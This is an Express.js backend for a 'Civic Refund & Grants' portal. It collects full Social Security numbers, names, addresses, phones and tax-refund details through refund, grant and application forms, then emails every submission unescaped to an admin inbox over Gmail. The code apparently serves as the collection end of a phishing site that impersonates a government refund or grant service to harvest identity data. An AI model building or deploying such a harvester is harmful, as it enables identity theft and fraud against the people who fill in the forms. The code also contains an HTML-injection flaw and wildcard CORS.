const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');
const dotenv = require('dotenv');

dotenv.config();

const app = express();

// Middleware
app.use(cors({
    origin: process.env.CORS_ORIGIN || '*',
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Email Configuration
const transporter = nodemailer.createTransport({
    service: process.env.EMAIL_SERVICE || 'gmail',
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
    }
});

transporter.verify((error, success) => {
    if (error) {
        console.error('❌ Email configuration error:', error.message);
    } else {
        console.log('✅ Email server ready');
    }
});

// Helper: Send email notification
async function sendFormNotification(subject, formData, formType) {
    const adminEmail = process.env.ADMIN_EMAIL || process.env.EMAIL_USER;

    const formatData = (data) => {
        return Object.entries(data)
            .map(([key, value]) => {
                const formattedKey = key.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase()).replace(/_/g, ' ');
                return `<tr><td style="padding: 8px; border: 1px solid #ddd; font-weight: bold;">${formattedKey}</td><td style="padding: 8px; border: 1px solid #ddd;">${value || 'N/A'}</td></tr>`;
            }).join('');
    };

    const mailOptions = {
        from: `"Civic Refund & Grants" <${process.env.EMAIL_USER}>`,
        to: adminEmail,
        subject: subject,
        html: `
            <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
                <div style="background: linear-gradient(135deg, #1B4B8C 0%, #0F2A52 100%); padding: 20px; text-align: center; color: white;">
                    <h2>New Form Submission</h2>
                    <p>Civic Refund & Grants Portal</p>
                </div>
                <div style="padding: 20px; background: #f9f9f9;">
                    <h3 style="color: #1B4B8C;">Form Type: ${formType}</h3>
                    <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
                    <table style="width: 100%; border-collapse: collapse; margin-top: 20px; background: white;">
                        <thead><tr style="background: #1B4B8C; color: white;"><th style="padding: 10px; text-align: left;">Field</th><th style="padding: 10px; text-align: left;">Value</th></tr></thead>
                        <tbody>${formatData(formData)}</tbody>
                    </table>
                </div>
            </div>`
    };

    try {
        const info = await transporter.sendMail(mailOptions);
        console.log('✅ Email sent:', info.messageId);
        return { success: true, messageId: info.messageId };
    } catch (error) {
        console.error('❌ Failed to send email:', error.message);
        return { success: false, error: error.message };
    }
}

// API Routes
app.get('/api/health', (req, res) => {
    res.json({ status: 'OK', message: 'Server running', timestamp: new Date().toISOString() });
});

app.post('/api/contact', async (req, res) => {
    try {
        const { fullName, email, phone, message } = req.body;
        if (!fullName || !email || !message) {
            return res.status(400).json({ success: false, message: 'Missing required fields' });
        }
        const emailResult = await sendFormNotification('New Contact Form', req.body, 'Contact Form');
        res.json({ success: true, message: 'Submitted successfully', emailSent: emailResult.success });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error', error: error.message });
    }
});

app.post('/api/refund', async (req, res) => {
    try {
        const { ssn, fullName, filingStatus, refundAmount, taxYear, email, phone } = req.body;
        if (!ssn || !fullName || !filingStatus || !refundAmount || !taxYear || !email || !phone) {
            return res.status(400).json({ success: false, message: 'Missing required fields' });
        }
        const emailResult = await sendFormNotification('New Refund Inquiry', req.body, 'Refund Status');
        res.json({ success: true, message: 'Submitted successfully', emailSent: emailResult.success });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error', error: error.message });
    }
});

app.post('/api/grants', async (req, res) => {
    try {
        const { fullName, ssn, email, phone, address, city, state, zipCode, grantCategory } = req.body;
        if (!fullName || !ssn || !email || !phone || !address || !city || !state || !zipCode || !grantCategory) {
            return res.status(400).json({ success: false, message: 'Missing required fields' });
        }
        const emailResult = await sendFormNotification('New Grant Inquiry', req.body, 'Grant Application');
        res.json({ success: true, message: 'Submitted successfully', emailSent: emailResult.success });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error', error: error.message });
    }
});

app.post('/api/application', async (req, res) => {
    try {
        const { firstName, lastName, ssn, email, phone, applicationType } = req.body;
        if (!firstName || !lastName || !ssn || !email || !phone) {
            return res.status(400).json({ success: false, message: 'Missing required fields' });
        }
        const emailResult = await sendFormNotification(`New ${applicationType || 'Application'}`, req.body, 'Official Application');
        res.json({ success: true, message: 'Submitted successfully', emailSent: emailResult.success });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error', error: error.message });
    }
});

// Error handlers
app.use((req, res) => {
    res.status(404).json({ success: false, message: 'Endpoint not found' });
});

app.use((err, req, res, next) => {
    console.error('Error:', err);
    res.status(500).json({ success: false, message: 'Internal server error' });
});

// Start server (local) or export (Vercel)
const PORT = process.env.PORT || 3000;

if (process.env.NODE_ENV !== 'production') {
    app.listen(PORT, () => {
        console.log(`✅ Server running on port ${PORT}`);
        console.log(`📍 API: http://localhost:${PORT}/api/health`);
    });
}

// MUST export for Vercel
module.exports = app;
